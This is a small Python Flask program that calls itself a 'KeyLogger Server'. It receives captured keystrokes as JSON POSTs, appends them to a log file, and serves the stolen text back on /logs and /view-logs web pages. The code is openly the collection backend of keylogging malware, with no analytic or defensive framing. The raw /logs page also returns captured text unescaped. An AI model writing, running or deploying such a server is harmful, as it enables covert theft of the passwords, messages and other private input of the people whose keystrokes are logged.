from flask import Flask, request, jsonify, render_template_string
import datetime
app = Flask(__name__)
@app.route('/')
def home():
 return "KeyLogger Server is Running"

LOG_FILE = "keystrokes.log"

@app.route("/log", methods=["POST"])
def log_key():
    data = request.json   # always assign first

    if not data or "time" not in data or "text" not in data:
        return jsonify({"status": "error", "message": "Invalid payload"}), 400

    time = data["time"]
    text = data["text"]

    with open(LOG_FILE, "a") as f:
        f.write('{'+time + ': \n' + '  ' + text + '\n }')

    return jsonify({"status": "ok", "logged": text})

@app.route("/logs", methods=["GET"])
def get_logs():
    with open(LOG_FILE, "r") as f:
        return "<pre>" + f.read() + "</pre>"

@app.route("/view-logs", methods=["GET"])
def view_logs():
    with open(LOG_FILE, "r") as f:
        logs = f.read()
    html = """
    <html>
        <head>
            <title>Keystroke Logs</title>
        </head>
        <body>
            <h1>Keystroke Logs</h1>
            <pre>{{ logs }}</pre>
        </body>
    </html>
    """
    return render_template_string(html, logs=logs)

if __name__ == "__main__":
    app.run(port=5000, debug=True)
